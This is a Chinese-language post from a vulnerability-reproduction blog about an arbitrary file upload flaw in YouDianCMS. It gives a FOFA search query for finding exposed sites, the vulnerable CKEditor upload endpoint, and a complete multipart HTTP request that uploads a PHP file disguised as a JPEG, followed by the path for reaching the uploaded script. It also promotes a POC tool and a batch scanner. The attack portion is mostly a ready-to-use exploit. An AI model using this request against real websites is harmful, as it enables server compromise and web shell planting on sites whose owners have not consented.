#  YouDianCMS友点系统存在任意文件上传漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-21 21:44  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. YouDianCMS友点系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
《友点企业网站管理系统》(YouDianCMS系统)集电脑网站、手机网站、微信、APP、小程序于一体,共用空间,数据自动同步,是五合一企业建站专业解决方案。  
## 2.漏洞描述  
  
《友点企业网站管理系统》(YouDianCMS系统)集电脑网站、手机网站、微信、APP、小程序于一体,共用空间,数据自动同步,是五合一企业建站专业解决方案。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
友点企业网站管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5uHewZoKyAxaAS0LT1yFLUJibbQIOFSWHdTQ5zNGjXGtRDrdUjGsWrlA/640?wx_fmt=jpeg&from=appmsg "null")  
  
YouDianCMS友点系统存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="友点建站-CMS"  
## 5.漏洞复现  
  
漏洞链接：https://1270.0.1/Public/ckeditor/plugins/multiimage/dialogs/image_upload.php  
  
漏洞数据包：  
```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 185
Content-Type: multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2

--cadc403efc1ad12f5fcce44c172baad2
Content-Disposition: form-data; name="files"; filename="c.php"
Content-Type: image/jpg

<?php phpinfo();?>
--cadc403efc1ad12f5fcce44c172baad2--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5uXMsJedLnn9wGDUQjnL0rqcuHE1EczfVIPkSrOCUEmKp6I0FbxrWug/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传成功后，会返回路径  
  
拼接上传的文件地址： https://127.0.0.1/Public/image/uploads/1708518585657.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5HGIGwEZFibkVtatoaBZ1VLzZFl3ZqStRat2q9ksY1WhOtN54pEnyLDA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现102 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd54KC4YwFicqgbXCtZWSNSYHYl67GsJLdgsU4I3qqOP53PIwNNBbXbt1w/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5vackia1GVFj8Z54tHwTzye5zYVfaAPBia7ibcsR37bVDzxxpibicN1Ysuww/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5XRJdfkE3PCQiaVbhIX76wgDbW6XKmjaAE1JyFD8aaIghMUgOy5FuNSQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5VKeqCfibaYKnjPtE3ECkJlc0pZqqQGKWjhKRBen9V55MS64IfsIoeibQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5lVe6nHmqXLW9Txrp50qUZIKwartsb0MFcykqzwUeGNzXYnYH96EGqA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZibFj9I4hSBLUFRNDibdexd5bEouoorjiaJ6AM31dLcyTaAPBuTl8X24nCAaHXWZ60ugfiaFvJkPq2nQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注官方更新补丁 https://www.youdiancms.com/  
## 8.往期回顾  
  
[泛微e-office系统存在敏感信息泄露 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485270&idx=1&sn=f4cf6552f69f84f34bf5b0a4ca9105bd&chksm=974b8a51a03c034716f9c5810f22c92ce967fffa736c5d879e247e2064f6e9d102cee0b332c2&scene=21#wechat_redirect)  
  
  
[亿赛通-数据泄露防护(DLP)44个接口存在远程命令执行漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485256&idx=1&sn=70c20d907235e4fbf0b0e8ba53afe8e6&chksm=974b8a4fa03c03593bae16f80b3c580dd2e6512c5c54c26220990616e75ff69af0ae76ec677e&scene=21#wechat_redirect)  
  
  
  
  
